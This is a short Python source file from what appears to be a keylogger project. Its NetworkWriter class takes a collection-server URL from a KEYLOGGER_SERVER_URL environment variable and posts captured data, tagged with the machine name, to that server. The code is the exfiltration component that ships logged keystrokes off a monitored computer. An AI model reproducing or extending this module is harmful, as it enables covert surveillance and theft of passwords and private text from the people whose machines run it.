import os, requests, json
from typing import Any
from iwriter import IWriter

class NetworkWriter(IWriter):
    def __init__(self, server_url: str | None = None, timeout_sec: float = 8.0):
        self.server_url = os.getenv("KEYLOGGER_SERVER_URL") or server_url or "http://127.0.0.1:5000/api/upload"
        self.timeout_sec = timeout_sec

    def send_data(self, data: Any, machine_name: str) -> None:

        if isinstance(data, dict):
            payload = {"machine": machine_name, "data": data}
        elif isinstance(data, str):
            payload = {"machine": machine_name, "data": data}
        else:
            raise TypeError("send_data expects dict or str (JSON)")

        try:
            requests.post(self.server_url, json=payload, timeout=self.timeout_sec).raise_for_status()
        except requests.RequestException as e:
            print(f"[NetworkWriter] send failed: {e}")
